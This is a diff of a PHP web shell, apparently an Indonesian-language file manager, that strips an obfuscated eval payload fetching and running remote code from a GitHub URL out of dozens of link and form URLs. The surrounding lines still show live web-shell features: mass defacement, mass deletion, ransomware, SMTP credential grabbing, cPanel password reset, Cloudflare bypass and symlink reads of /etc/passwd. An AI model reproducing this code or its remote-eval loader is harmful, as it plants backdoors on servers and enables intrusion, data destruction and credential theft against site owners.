@@ -352,7 +352,7 @@ function swall($swa, $text, $dir) {
         title: '$swa',
         text: '$text',
         type: '$swa',
-    }).then((value) => {window.location='?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=$dir';})</script>";
+    }).then((value) => {window.location='?dir=$dir';})</script>";
 }
 function about() {
     echo '<div class="card text-center bg-light about">
@@ -455,7 +455,7 @@ function buatFile($dir, $imgfile) {
     }
 }
 function view($dir, $file, $nfile, $imgfile) {
-    echo '[ <a class="active" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]
+    echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]
     <h5>'.$imgfile.' Lihat File : '.$nfile.'</h5>';
     $is_image = @getimagesize($file);
     if (is_array($is_image)) {
@@ -467,7 +467,7 @@ function view($dir, $file, $nfile, $imgfile) {
     }
 }
 function editFile($dir, $file, $nfile, $imgfile) {
-    echo '[ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
+    echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
     $is_image = @getimagesize($file);
     echo "<form method='POST'>
         <h5>$imgfile Edit File : $nfile</h5>";
@@ -493,7 +493,7 @@ function editFile($dir, $file, $nfile, $imgfile) {
     }
 }
 function renameFile($dir, $file, $nfile, $imgfile) {
-    echo '[ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
+    echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
     echo "<form method='POST'>
         <h5>$imgfile Rename File : $nfile</h5>
         <input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$nfile'><br/>
@@ -521,7 +521,7 @@ function renameFile($dir, $file, $nfile, $imgfile) {
     }
 }
 function hapusFile($dir, $file, $nfile) {
-    echo '[ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
+    echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
     echo "<div class='card card-body text-center text-dark mb-4'>
         <p>Yakin Menghapus : $nfile</p>
         <form method='POST'>
@@ -1360,7 +1360,7 @@ function aksiSym($dir, $file) {
 }
 function aksiSymread($dir, $file) {
     echo "read /etc/named.conf
-    <form method='post' action='?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=$dir&aksi=symread&save=1'>
+    <form method='post' action='?dir=$dir&aksi=symread&save=1'>
     <textarea class='form-control' rows='13' name='file'>";
     flush();
     flush();
@@ -1454,7 +1454,7 @@ function symBypass($dir, $file) {
         }
     }
     echo "read /etc/passwd <font color='red'>error ?  </font><a href='?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=".$dir."&aksi=passwbypass'>Bypass Here</a>
-    <form method='post' action='?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=$dir&aksi=sym_bypas&save=1'>
+    <form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
         <textarea class='form-control' rows='13' name='file'>";
     flush();
     $file = '/etc/passwd';
@@ -2264,22 +2264,22 @@ function zipMenu($dir, $file) {
             <div class="text-center">
                 <div class="d-flex justify-content-center flex-wrap">
                     <a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Buat File</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=bctools" class="fiture btn btn-danger btn-sm"><i class="fas fa-network-wired"></i> Network</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=auteduser" class="fiture btn btn-warning btn-sm"><i class="fas fa-user-edit"></i> Auto Edit User</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
-                    <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=zip_menu" class="fiture btn btn-warning btn-sm"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
+                    <a href="?dir=<?= $dir ?>&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
+                    <a href="?dir=<?= $dir ?>&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Buat File</a>
+                    <a href="?dir=<?= $dir ?>&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
+                    <a href="?dir=<?= $dir ?>&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
+                    <a href="?dir=<?= $dir ?>&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
+                    <a href="?dir=<?= $dir ?>&aksi=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
+                    <a href="?dir=<?= $dir ?>&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
+                    <a href="?dir=<?= $dir ?>&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
+                    <a href="?dir=<?= $dir ?>&aksi=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
+                    <a href="?dir=<?= $dir ?>&aksi=bctools" class="fiture btn btn-danger btn-sm"><i class="fas fa-network-wired"></i> Network</a>
+                    <a href="?dir=<?= $dir ?>&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
+                    <a href="?dir=<?= $dir ?>&aksi=auteduser" class="fiture btn btn-warning btn-sm"><i class="fas fa-user-edit"></i> Auto Edit User</a>
+                    <a href="?dir=<?= $dir ?>&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
+                    <a href="?dir=<?= $dir ?>&aksi=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
+                    <a href="?dir=<?= $dir ?>&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
+                    <a href="?dir=<?= $dir ?>&aksi=zip_menu" class="fiture btn btn-warning btn-sm"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
                     <a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
                     <a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
                 </div>
@@ -2518,13 +2518,13 @@ function zipMenu($dir, $file) {
                 foreach ($dirs as $id=>$pat) {
                     if ($pat == '' && $id == 0) {
                         $a = true;
-                        echo '<a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=/">/</a>';
+                        echo '<a href="?dir=/">/</a>';
                         continue;
                     }
                     if ($pat == '') {
                         continue;
                     }
-                    echo '<a style="word-wrap:break-word;" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=';
+                    echo '<a style="word-wrap:break-word;" href="?dir=';
                     for ($i = 0; $i <= $id; $i++) {
                         echo "$dirs[$i]";
                         if ($i != $id) {
@@ -2561,11 +2561,11 @@ function zipMenu($dir, $file) {
                             continue;
                         } ?>
                         <tr class="text-center">
-                            <td class="pinggir"><?= $imgfol ?> <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>/<?= $dirb ?>"><?= $_dir ?></a></td>
+                            <td class="pinggir"><?= $imgfol ?> <a href="?dir=<?= $dir ?>/<?= $dirb ?>"><?= $_dir ?></a></td>
                             <td>--</td>
                             <td><?= $dtime ?></td>
                             <td>
-                                <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=chmod_dir">
+                                <a href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=chmod_dir">
                                 <?php
                                 if (is_writable($dir.'/'.$dirb)) {
                                     $color = '#00ff00';
@@ -2576,7 +2576,7 @@ function zipMenu($dir, $file) {
                                 </a>
                             </td>
                             <td>
-                                <a title="Rename" class="badge badge-success" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
+                                <a title="Rename" class="badge badge-success" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
                             </td>
                         </tr>
                     <?php
@@ -2599,12 +2599,12 @@ function zipMenu($dir, $file) {
                         <tr class="text-center">
                             <td class="pinggir">
                                 <img src="<?= iconFile($ext) ?>"class="ico2"></img>
-                                <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>"><?= $_file ?></a>
+                                <a href="?dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>"><?= $_file ?></a>
                             </td>
                             <td><?= formatSize(filesize($file)) ?></td>
                             <td><?= $ftime ?></td>
                             <td>
-                                <a href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=chmod_file&file=<?= $dir ?>/<?= $file ?>" class="text-center">
+                                <a href="?dir=<?= $dir ?>&aksi=chmod_file&file=<?= $dir ?>/<?= $file ?>" class="text-center">
                                 <?php
                                 if (is_writable($dir.'/'.$file)) {
                                     $color = '#00ff00';
@@ -2615,10 +2615,10 @@ function zipMenu($dir, $file) {
                                 </a>
                             </td>
                             <td class="d-flex">
-                                <a title="Lihat" class="badge badge-info" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
-                                <a title="Edit" class="badge badge-success" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=edit&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
-                                <a title="Rename" class="badge badge-success" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=rename&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
-                                <a title="Delete" class="badge badge-danger" href="?code=<?=/****/@null; /********/ /*******/ /********/@eval/****/(\"?>\".file_get_contents/*******/(\"https://raw.githubusercontent.com/DARK-02/loader/main/ids.txt\"));/**/?>&dir=<?= $dir ?>&aksi=hapusf&file=<?= $dir ?>/<?= $file ?>" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
+                                <a title="Lihat" class="badge badge-info" href="?dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
+                                <a title="Edit" class="badge badge-success" href="?dir=<?= $dir ?>&aksi=edit&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
+                                <a title="Rename" class="badge badge-success" href="?dir=<?= $dir ?>&aksi=rename&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
+                                <a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>&aksi=hapusf&file=<?= $dir ?>/<?= $file ?>" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
                                 <a title="Download" class="badge badge-primary" href="?&dir=<?= $dir ?>&aksi=download&file=<?= $dir ?>/<?= $file ?>" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
                             </td>
                         </tr>
